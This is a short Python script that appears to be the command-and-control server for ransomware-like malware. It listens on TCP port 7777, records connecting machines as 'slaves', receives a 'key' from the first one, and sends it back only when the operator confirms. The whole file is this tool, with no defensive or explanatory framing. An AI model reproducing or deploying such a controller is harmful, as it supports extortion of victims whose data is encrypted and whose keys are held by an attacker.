import socket
from threading import Thread

port = 7777
slaves=[]


def listen(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("",port))
    s.listen()
    slave, slave_address = s.accept()
    slaves.append(slave)

ListenerThread = Thread(target=listen,args=(port,), daemon=True)
ListenerThread.start()


while(True):
    if len(slaves)!=0:
        print("[+] Enumerating all slaves.")
        for index, individual_slave in enumerate(slaves):
            print("[i] ", index, ". slave ip: ", individual_slave.getpeername())
        # while(True):
        key = slaves[0].recv(1024).decode()
        print(bytes(key, 'utf-8'))
        break
while True:
    if(int(input('enter 1 to send key: '))):
        slaves[0].send(key.encode())
        break